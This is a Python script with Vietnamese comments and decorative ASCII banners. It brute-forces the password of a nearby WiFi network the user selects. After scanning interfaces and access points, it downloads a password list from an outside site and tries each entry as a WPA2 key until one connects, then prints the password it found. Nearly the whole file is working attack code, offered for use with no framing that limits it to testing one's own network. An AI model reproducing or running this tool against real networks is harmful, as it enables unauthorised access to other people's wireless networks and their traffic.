#tool by hoang_anh :))) 

import pywifi
from pywifi import const
import time
import os
import requests
# Brute force wifi password
# cho phép chọn interface
# cho phép chọn wifi muốn dò password

logo ="""
  \033[1;31m██╗  ██╗ ██████╗  █████╗ ███╗   ██╗ ██████╗      █████╗ ███╗   ██╗██╗  ██╗     
  \033[1;36m██║  ██║██╔═══██╗██╔══██╗████╗  ██║██╔════╝     ██╔══██╗████╗  ██║██║  ██║   
  \033[1;32m███████║██║   ██║███████║██╔██╗ ██║██║  ███╗    ███████║██╔██╗ ██║███████║     
  \033[1;33m██╔══██║██║   ██║██╔══██║██║╚██╗██║██║   ██║    ██╔══██║██║╚██╗██║██╔══██║  
  \033[1;31m██║  ██║╚██████╔╝██║  ██║██║ ╚████║╚██████╔╝    ██║  ██║██║ ╚████║██║  ██║
  \033[1;35m╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
                     \x1b[38;2;39;216;255mtool check pass wifi by Hoàng Anh
"""
# đây là hàm để quét các interface
def scan_wifi_interfaces():
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    return interfaces

def run(text, delay=0.001):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def run2(text, delay=0.01):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def clear_previous_output():
    os.system('cls' if os.name == 'nt' else 'clear')
  
# Chọn interface
def select_wifi_interface(interfaces):
    clear_previous_output()
    run(logo)
    print("\033[96m\033[1mGiao diện WiFi có sẵn:")
    for i, interface in enumerate(interfaces):
        run2("\033[93m\033[1m{}. {}".format(i+1, interface.name()))
    selection = int(input("\033[94m\033[1mChọn giao diện (nhập số tương ứng):\033[93m\033[1m "))
    
    # nếu chọn lung tung mà không có interface thì trả về None
    # nếu có thì chọn interface đó
    if selection < 1 or selection > len(interfaces):
        print("\033[91mLựa chọn không hợp lệ.")
        return None
    return interfaces[selection - 1]

# Với interface vừa chọn, quét các mạng wifi có thể kết nối đến
def scan_wifi_access_points(interface):
    interface.scan()
    ssid_list = interface.scan_results()
    access_points = []
    for ssid in ssid_list:
        access_points.append({'SSID': ssid.ssid, 'BSSID': ssid.bssid})
    return access_points

# chọn wifi để kết nối thôi
def select_wifi_access_point(access_points):
    clear_previous_output()
    run(logo)
    print("\033[96m\033[1mCác wifi xung quanh quét được:")
    for i, ap in enumerate(access_points):
        print("\033[93m\033[1m{}. SSID: {}, BSSID: {}".format(i+1, ap['SSID'], ap['BSSID']))
    selection = int(input("\033[94m\033[1mChọn một điểm truy cập (nhập số tương ứng):\033[93m\033[1m "))
    
    # Nếu chọn không đúng thì trả về None
    # Nếu đúng thì đưa đến bước thử password
    if selection < 1 or selection > len(access_points):
        print("\033[91mLựa chọn không hợp lệ.")
        return None
    return access_points[selection - 1]


# Load 1 file chứa password
# có thể download trên mạng
# hoặc dùng file có sẵn trong kali linux
def load_passwords_from_url(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            passwords = response.text.splitlines()
            return passwords
        else:
            print("\033[91mKhông thể tải dữ liệu từ URL.")
            return None
    except requests.exceptions.RequestException:
        print("\033[91mLỗi khi thực hiện yêu cầu tới URL.")
        return None

# Hàm xử lý việc kết nối đến wifi
def connect_to_wifi(interface, access_point, password=None):
    profile = pywifi.Profile()
    profile.ssid = access_point['SSID']
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    if password:
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
    else:
        profile.cipher = const.CIPHER_TYPE_NONE
    interface.remove_all_network_profiles()
    tmp_profile = interface.add_network_profile(profile)
    interface.connect(tmp_profile)
    
    # Đợi kết nối
    # Có thể chỉnh lên hoặc xuống
    # tùy vào tốc độ xử lý mạng
    # đây mặc định mình để 2 giây
    time.sleep(2)
    connected = False
    if interface.status() == const.IFACE_CONNECTED:
        connected = True
    return connected


##
##
## Đây là đoạn gọi code để chạy
##
##

# Quét các interface khả dụng
interfaces = scan_wifi_interfaces()

# chọn 1 interface
interface = select_wifi_interface(interfaces)

nhện = """
\033[91m\033[1m
            #               #
          ##                 ##
         ##                   ##
        ##                     ##
        ##                     ##
        ##                     ##
         ##                   ##
     ##  ##                   ##  ##
    ##   ##                   ##   ##
   ##     ##                 ##     ##
   #       ###             ###       #
   ##       ###           ###       ##
   ###       ###  #####  ###       ###
    ######    #############   #######
         ######################
    ################################
   ### ########################## ###
  ###         ############         ###
 ##         #################        ##
 ##     ########################     ##
##     ###  ################  ###     ##
 ##    ##   #######  #######   ##    ##
  #    ##   #######  #######   ##    #
   #   ##   ################   ##   #
    #  ##    ##############    ##  #
       ##     ############     ##
       ##       ########       ##
        ##                    ##
        
                            \033[4m\033[94mBY HOÀNG ANH
\033[0m
"""


    


if interface:
    # Quét wifi có thể kết nối
    access_points = scan_wifi_access_points(interface)

    # Chọn wifi
    access_point = select_wifi_access_point(access_points)
    clear_previous_output()
    run(nhện)

    if access_point:
        
        # load file chứa password 
        passwords = load_passwords_from_url("https://hoanganh.eu.org/passwifivn.txt")

        
        # Thực hiện thử password
        if passwords is not None:
            # Try each password until a successful connection is made
            for password in passwords:
                # Connect to the selected access point
                if connect_to_wifi(interface, access_point, password):
                    print("\033[92m\033[1mKết nối thành công với điểm truy cập: \033[4m\033[93m'{}'\033[0m".format(password))
                    break
                else:
                    print("\033[91m\033[1mKhông thể kết nối bằng mật khẩu: \033[4m\033[93m'{}'\033[0m".format(password))
            else:
                print("All passwords have been tried. Failed to connect to the access point.")